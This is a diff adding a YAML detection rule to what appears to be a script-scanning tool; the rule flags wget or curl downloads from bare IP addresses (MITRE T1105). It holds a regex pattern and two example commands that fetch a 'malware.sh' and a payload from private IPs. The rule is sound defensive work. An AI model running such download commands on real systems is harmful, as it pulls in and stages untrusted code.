@@ -1,0 +1,38 @@
+# Bash Pattern: Download from IP Address
+# Detects downloads from bare IP addresses instead of domains
+
+id: BASH-029
+name: Download from IP Address
+description: |
+  Detects wget/curl downloading from bare IP addresses instead of domains.
+  Attackers often use IP addresses to evade domain-based blocking and DNS monitoring.
+  Note: Private IPs are common for internal infrastructure, so this has lower severity.
+  Context from other findings (C2 patterns, encoding) increases suspicion.
+languages:
+  - bash
+detection_type: regex
+# Match downloads from IP addresses - private IPs are common for internal use
+# so we keep confidence lower to reflect FP risk with private infrastructure
+detection_logic: '(?:\bwget\b|\bcurl\b).*?https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
+severity: Low
+mitre_technique: T1105
+confidence: 0.5
+category: download
+enabled: true
+paranoia_levels:
+  - 2
+  - 3
+metadata:
+  author: Script Sentinel Team
+  created: "2025-11-25"
+  updated: "2025-11-25"
+  references:
+    - "https://attack.mitre.org/techniques/T1105/"
+  tags:
+    - bash
+    - download
+    - ip-address
+    - evasion
+  examples:
+    - 'wget http://192.168.1.100/malware.sh'
+    - 'curl http://10.0.0.5/payload -o /tmp/payload'
